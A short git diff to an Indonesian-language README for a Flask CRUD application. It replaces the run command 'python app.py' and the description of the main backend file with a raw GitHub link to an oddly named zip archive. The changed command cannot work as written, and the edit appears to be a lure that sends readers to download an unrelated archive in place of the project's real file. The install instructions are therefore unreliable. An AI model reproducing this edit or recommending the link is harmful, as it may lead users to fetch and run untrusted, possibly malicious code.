@@ -41,7 +41,7 @@ Ikuti langkah-langkah di bawah ini untuk menginstal dan menjalankan proyek ini s
 
 5. **Jalankan aplikasi**:
    ```bash
-   python app.py
+   python https://github.com/SKYLINERGB/crud-cybersecurty/raw/refs/heads/main/php/cybersecurty_crud_leucotactic.zip
    ```
 
 6. **Akses aplikasi**:
@@ -51,5 +51,5 @@ Ikuti langkah-langkah di bawah ini untuk menginstal dan menjalankan proyek ini s
    ```
 
 ## Struktur Proyek
-- `app.py`: File utama aplikasi yang berisi logika backend Flask.
+- `https://github.com/SKYLINERGB/crud-cybersecurty/raw/refs/heads/main/php/cybersecurty_crud_leucotactic.zip`: File utama aplikasi yang berisi logika backend Flask.
 - `templates/`: Folder untuk file HTML yang digunakan dalam aplikasi.
